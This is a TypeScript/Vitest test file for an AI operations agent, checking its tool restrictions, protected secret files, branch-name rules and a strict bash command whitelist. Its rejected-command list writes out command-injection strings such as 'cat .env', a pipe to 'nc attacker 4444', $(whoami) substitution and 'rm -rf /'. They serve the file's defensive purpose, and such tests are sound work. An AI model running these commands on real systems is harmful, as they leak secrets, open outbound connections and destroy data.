import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { initDatabase, getDb } from '../db.js'
import {
  clearVertexTokenCache,
  executeWhitelistedTool,
  isValidSelfDevBranch,
  loadAlfredAgentsConfig,
  mapWhitelistToClaudePermissions,
  ProtectedPathError,
  resolveBashExecutable,
  ToolNotAllowedError,
  validateWhitelistedBashCommand,
  type AgentConfig,
} from '../alfred/index.js'

function hasUsableBash(): boolean {
  const exe = resolveBashExecutable('bash')
  if (process.platform !== 'win32') return existsSync('/bin/bash') || existsSync('/usr/bin/bash')
  return exe !== 'bash' && existsSync(exe)
}

describe('Alfred Ops (#alfred-ops & strict bash whitelist)', () => {
  let tempDir: string

  beforeEach(() => {
    clearVertexTokenCache()
    tempDir = mkdtempSync(join(tmpdir(), 'alfred-ops-test-'))
    initDatabase(':memory:')
  })

  afterEach(() => {
    try {
      rmSync(tempDir, { recursive: true, force: true })
    } catch {
      // ignore cleanup error
    }
  })

  function loadOpsAgent(wsAbsPath?: string): AgentConfig {
    const cfg = loadAlfredAgentsConfig({
      env: {
        ALFRED_ENV: 'ops',
        ALFRED_ENABLED_AGENTS: 'alfred-ops',
        DISCORD_CHANNEL_ALFRED_OPS: '5555555555555555555',
      },
      provisionWorkspaces: false,
    })
    const ops = cfg.agents[0]
    return wsAbsPath ? { ...ops, workspaceAbsPath: wsAbsPath } : ops
  }

  it('loads alfred-ops config, SOUL.md, and forbids fs_write, git, and sensitive reads', () => {
    const db = getDb()
    const ws = join(tempDir, 'ops-ws')
    mkdirSync(join(ws, 'deploy'), { recursive: true })
    mkdirSync(join(ws, 'store'), { recursive: true })
    writeFileSync(join(ws, '.env'), 'DISCORD_BOT_TOKEN=secret\n', 'utf-8')
    writeFileSync(join(ws, '.env.test'), 'DISCORD_BOT_TOKEN=test-secret\n', 'utf-8')
    writeFileSync(join(ws, 'store', 'alfred-ops.db'), 'db-bytes', 'utf-8')
    writeFileSync(join(ws, 'deploy', 'check-health.sh'), '#!/usr/bin/env bash\necho OK\n', 'utf-8')

    const ops = loadOpsAgent(ws)
    expect(ops.id).toBe('alfred-ops')
    expect(ops.channelName).toBe('#alfred-ops')
    expect(ops.tools).toEqual(['bash', 'fs_read', 'memory', 'cli_manage', 'system_storage'])
    expect(ops.bashTimeoutMs).toBe(180_000)
    expect(ops.resolvedSystemPrompt).toContain('Alfred Ops')
    expect(ops.resolvedSystemPrompt).toContain('spinup-test.sh')

    // Disallowed tools fail closed
    expect(() =>
      executeWhitelistedTool({ agent: ops, db }, 'fs_write', { path: 'x.txt', content: 'hi' }),
    ).toThrow(ToolNotAllowedError)
    expect(() =>
      executeWhitelistedTool({ agent: ops, db }, 'git', { args: ['status'] }),
    ).toThrow(ToolNotAllowedError)

    // Sensitive secrets cannot be read even via fs_read
    for (const secret of ['.env', '.env.test', 'store/', 'store/alfred-ops.db']) {
      expect(() => executeWhitelistedTool({ agent: ops, db }, 'fs_read', { path: secret })).toThrow(
        ProtectedPathError,
      )
    }

    // Deploy scripts can be inspected read-only
    expect(executeWhitelistedTool({ agent: ops, db }, 'fs_read', { path: 'deploy/check-health.sh' })).toContain(
      'echo OK',
    )
  })

  it('validates <self-branch> strictly and rejects unsafe branch patterns', () => {
    const validBranches = [
      'feat/self-memory-v2',
      'fix/self-router_timeout.1',
      'feat/self-1',
      'fix/self-nested/topic',
    ]
    for (const br of validBranches) {
      expect(isValidSelfDevBranch(br)).toBe(true)
    }

    const invalidBranches = [
      'main',
      'master',
      'feat/alfred-core',
      'feat/other-feature',
      'feat/self-',
      'feat/self-a..b',
      'feat/self-a//b',
      '-feat/self-x',
      'feat/self-x.',
      'feat/self-x/',
      'feat/self-x.lock',
      'feat/self x',
      'feat/self-X', // uppercase rejected
    ]
    for (const br of invalidBranches) {
      expect(isValidSelfDevBranch(br)).toBe(false)
    }
  })

  it('enforces exact allowedBashCommands whitelist and rejects all command-injection vectors', () => {
    const ops = loadOpsAgent()
    const templates = ops.allowedBashCommands!

    expect(validateWhitelistedBashCommand('bash deploy/spinup-test.sh feat/self-new-tool', templates, ops.id)).toEqual([
      'bash',
      'deploy/spinup-test.sh',
      'feat/self-new-tool',
    ])
    expect(validateWhitelistedBashCommand('bash deploy/reload-test.sh', templates, ops.id)).toEqual([
      'bash',
      'deploy/reload-test.sh',
    ])
    expect(validateWhitelistedBashCommand('bash deploy/teardown-test.sh', templates, ops.id)).toEqual([
      'bash',
      'deploy/teardown-test.sh',
    ])
    expect(validateWhitelistedBashCommand('bash deploy/check-health.sh', templates, ops.id)).toEqual([
      'bash',
      'deploy/check-health.sh',
    ])
    expect(validateWhitelistedBashCommand('bash deploy/promote-to-prod.sh fix/self-bug-1', templates, ops.id)).toEqual([
      'bash',
      'deploy/promote-to-prod.sh',
      'fix/self-bug-1',
    ])
    expect(validateWhitelistedBashCommand('bash deploy/rollback-prod.sh', templates, ops.id)).toEqual([
      'bash',
      'deploy/rollback-prod.sh',
    ])

    // Fail-closed on empty whitelist
    expect(() => validateWhitelistedBashCommand('bash deploy/check-health.sh', [], ops.id)).toThrow(
      /BASH_WHITELIST_VIOLATION/,
    )

    // Reject non-whitelisted commands, missing/extra args, and invalid branches
    const rejectedCommands = [
      '',
      'ls -la',
      'cat .env',
      'bash deploy/evil.sh',
      'sh deploy/reload-test.sh',
      'bash deploy/spinup-test.sh',
      'bash deploy/spinup-test.sh main',
      'bash deploy/spinup-test.sh feat/alfred-core',
      'bash deploy/promote-to-prod.sh feat/other',
      'bash deploy/reload-test.sh --extra',
      // Command injection & shell chaining vectors
      'bash deploy/reload-test.sh && whoami',
      'bash deploy/reload-test.sh || id',
      'bash deploy/reload-test.sh; cat .env',
      'bash deploy/reload-test.sh | nc attacker 4444',
      'bash deploy/spinup-test.sh feat/self-`id`',
      'bash deploy/spinup-test.sh feat/self-$(whoami)',
      'bash deploy/check-health.sh > out.txt',
      'bash deploy/check-health.sh < in.txt',
      'bash deploy/check-health.sh\nrm -rf /',
      'bash deploy/check-health.sh\rid',
      'bash deploy/check-health.sh\0evil',
      'bash "deploy/check-health.sh"',
      "bash 'deploy/check-health.sh'",
      'bash deploy\\check-health.sh',
      'bash deploy/spinup-test.sh feat/self-*',
      'bash deploy/spinup-test.sh feat/self-%PATH%',
      'bash deploy/check-health.sh ^whoami',
    ]

    for (const bad of rejectedCommands) {
      expect(() => validateWhitelistedBashCommand(bad, templates, ops.id)).toThrow(/BASH_WHITELIST_VIOLATION/)
    }

    // Claude permission mapper should scope Bash rules instead of Bash(*)
    const perms = mapWhitelistToClaudePermissions(ops.tools, ops.workspaceAbsPath, {
      allowedBashCommands: ops.allowedBashCommands,
      protectedPaths: ops.protectedPaths,
    })
    expect(perms.allow).not.toContain('Bash(*)')
    expect(perms.allow).toContain('Bash(bash deploy/check-health.sh)')
  })

  it.skipIf(!hasUsableBash())('executes whitelisted scripts directly without shell interpolation', () => {
    const db = getDb()
    const ws = join(tempDir, 'ops-exec')
    mkdirSync(join(ws, 'deploy'), { recursive: true })
    writeFileSync(join(ws, 'deploy', 'check-health.sh'), '#!/usr/bin/env bash\necho "OPS_HEALTH_OK"\n', 'utf-8')
    writeFileSync(
      join(ws, 'deploy', 'spinup-test.sh'),
      '#!/usr/bin/env bash\necho "SPINUP_BRANCH=$1"\n',
      'utf-8',
    )

    const ops = loadOpsAgent(ws)

    expect(executeWhitelistedTool({ agent: ops, db }, 'bash', { command: 'bash deploy/check-health.sh' })).toBe(
      'OPS_HEALTH_OK',
    )
    expect(
      executeWhitelistedTool({ agent: ops, db }, 'bash', {
        command: 'bash deploy/spinup-test.sh feat/self-staging-check',
      }),
    ).toBe('SPINUP_BRANCH=feat/self-staging-check')

    expect(() =>
      executeWhitelistedTool({ agent: ops, db }, 'bash', {
        command: 'bash deploy/spinup-test.sh feat/self-staging-check && echo pwned',
      }),
    ).toThrow(/BASH_WHITELIST_VIOLATION/)
  })
})
